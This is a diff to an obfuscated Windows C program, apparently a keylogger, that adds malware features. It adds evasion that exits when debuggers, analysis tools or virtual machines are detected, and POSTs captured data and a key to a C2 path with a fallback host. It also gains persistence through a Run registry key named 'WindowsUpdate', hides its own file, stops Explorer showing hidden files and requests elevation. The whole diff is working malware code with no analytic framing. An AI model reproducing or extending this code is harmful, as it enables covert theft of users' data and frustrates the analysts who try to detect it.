@@ -4,6 +4,13 @@
 #include <psapi.h>
 #include <stdlib.h>
 #include <time.h>
+#include <shlobj.h>
+#include <shlwapi.h>
+#include <tchar.h>
+
+#pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Shell32.lib")
+#pragma comment(lib, "Shlwapi.lib")
 
 #define O1 1024
 #define O2 2000
@@ -12,6 +19,8 @@ char V1[O1];
 int V2 = 0;
 CRITICAL_SECTION V3;
 char* O3 = "example.com";
+char* O5 = "/c2/data";
+char* O6 = "Content-Type: application/json\r\nUser-Agent: TLD11Browser/10.0";
 
 typedef SHORT (WINAPI *F3)(int);
 F3 O4;
@@ -37,8 +46,11 @@ BOOL F6() {
 
 BOOL F7() {
     const char* V10[] = {
-        "vmware.exe", "vboxservice.exe", "vboxtray.exe",
-        "vmtoolsd.exe", "vmcompute.exe", "vmmem.exe"
+        "procexp.exe", "ProcessHacker.exe", "wireshark.exe", "tcpview.exe",
+        "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "idaq.exe", "idaq64.exe",
+        "idag.exe", "idag64.exe", "ghidra.exe", "windbg.exe", "cheatengine.exe",
+        "autoruns.exe", "handle.exe", "immunitydebugger.exe", "radare2.exe",
+        "hiew.exe", "procmon.exe"
     };
     DWORD V11[1024], V12, V13;
     unsigned int V14;
@@ -62,7 +74,8 @@ BOOL F7() {
             for (int V19 = 0; V19 < sizeof(V10) / sizeof(V10[0]); V19++) {
                 if (strstr(V15, V10[V19]) != NULL) {
                     CloseHandle(V16);
-                    return TRUE;
+                    printf("stop trying to analyze me plz :3\n");
+                    exit(1);
                 }
             }
             CloseHandle(V16);
@@ -71,34 +84,69 @@ BOOL F7() {
     return FALSE;
 }
 
-void F1() {
-    if (F6() || F7()) {
-        return;
+BOOL F8() {
+    CURSORINFO V32 = { sizeof(CURSORINFO) };
+    if (GetCursorInfo(&V32)) {
+        return V32.flags == 0;
+    }
+    return FALSE;
+}
+
+BOOL F9() {
+    int V33[4] = { 0 };
+    __cpuid(V33, 0x40000000);
+    char V34[13];
+    memcpy(V34, &V33[1], 4);
+    memcpy(V34 + 4, &V33[2], 4);
+    memcpy(V34 + 8, &V33[3], 4);
+    V34[12] = '\0';
+
+    if (strcmp(V34, "VMwareVMware") == 0 ||
+        strcmp(V34, "KVMKVMKVM") == 0 ||
+        strcmp(V34, "VBoxVBoxVBox") == 0) {
+        printf("stop trying to analyze me plz :3\n");
+        exit(1);
     }
 
+    return FALSE;
+}
+
+void F10() {
     HINTERNET V20 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (V20) {
         HINTERNET V21 = InternetConnectA(V20, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-        if (V21) {
-            const char *O5 = "/data";
-            const char *O6 = "Content-Type: application/json\r\nUser-Agent: TLD9Browser/2.0";
-            HINTERNET V22 = HttpOpenRequestA(V21, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
-            if (V22) {
-                char V23[4];
-                F4(V23);
-                F5(V1, V23);
-
-                char V24[O1 + 128];
-                sprintf(V24, "{\"content\":\"%s\",\"key\":\"%s\"}", V1, V23);
-
-                if (HttpSendRequestA(V22, O6, -1, V24, strlen(V24))) {
-                }
-                InternetCloseHandle(V22);
+        if (!V21) {
+            V21 = InternetConnectA(V20, "example2.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+            if (!V21) {
+                InternetCloseHandle(V20);
+                return;
             }
-            InternetCloseHandle(V21);
         }
+
+        HINTERNET V22 = HttpOpenRequestA(V21, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+        if (V22) {
+            char V23[4];
+            F4(V23);
+            F5(V1, V23);
+
+            char V24[O1 + 128];
+            sprintf(V24, "{\"content\":\"%s\",\"key\":\"%s\"}", V1, V23);
+
+            if (HttpSendRequestA(V22, O6, -1, V24, strlen(V24))) {
+            }
+            InternetCloseHandle(V22);
+        }
+        InternetCloseHandle(V21);
         InternetCloseHandle(V20);
     }
+}
+
+void F1() {
+    if (F6() || F7() || F9() || F8()) {
+        return;
+    }
+
+    F10();
 
     EnterCriticalSection(&V3);
     V2 = 0;
@@ -189,7 +237,74 @@ DWORD WINAPI F2(LPVOID O7) {
     return 0;
 }
 
+void F11(const char* V35) {
+    HKEY V36;
+    LONG V37 = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &V36);
+    if (V37 == ERROR_SUCCESS) {
+        V37 = RegSetValueEx(V36, "WindowsUpdate", 0, REG_SZ, (BYTE*)V35, strlen(V35) + 1);
+        RegCloseKey(V36);
+    }
+}
+
+void F12(const char* V38) {
+    SetFileAttributes(V38, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+}
+
+void F13() {
+    HKEY V39;
+    LONG V40 = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_SET_VALUE, &V39);
+    if (V40 == ERROR_SUCCESS) {
+        DWORD V41 = 0;
+        RegSetValueEx(V39, "Hidden", 0, REG_DWORD, (BYTE*)&V41, sizeof(V41));
+        RegSetValueEx(V39, "ShowSuperHidden", 0, REG_DWORD, (BYTE*)&V41, sizeof(V41));
+        RegCloseKey(V39);
+    }
+}
+
+void F14() {
+    BOOL V42 = FALSE;
+    HANDLE V43 = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &V43)) {
+        TOKEN_ELEVATION V44;
+        DWORD V45 = sizeof(TOKEN_ELEVATION);
+
+        if (GetTokenInformation(V43, TokenElevation, &V44, sizeof(V44), &V45)) {
+            V42 = V44.TokenIsElevated;
+        }
+        CloseHandle(V43);
+    }
+
+    if (!V42) {
+        TCHAR V46[MAX_PATH];
+        if (GetModuleFileName(NULL, V46, MAX_PATH)) {
+            SHELLEXECUTEINFO V47 = { sizeof(V47) };
+            V47.lpVerb = TEXT("runas");
+            V47.lpFile = V46;
+            V47.hwnd = NULL;
+            V47.nShow = SW_NORMAL;
+
+            if (!ShellExecuteEx(&V47)) {
+                exit(1);
+            } else {
+                exit(0);
+            }
+        }
+    }
+}
+
 int wmain() {
+    F14();
+
+    TCHAR V48[MAX_PATH];
+    GetModuleFileName(NULL, V48, MAX_PATH);
+
+    F11(V48);
+
+    F13();
+
+    F12(V48);
+
     DWORD V30;
     HANDLE V31;
 
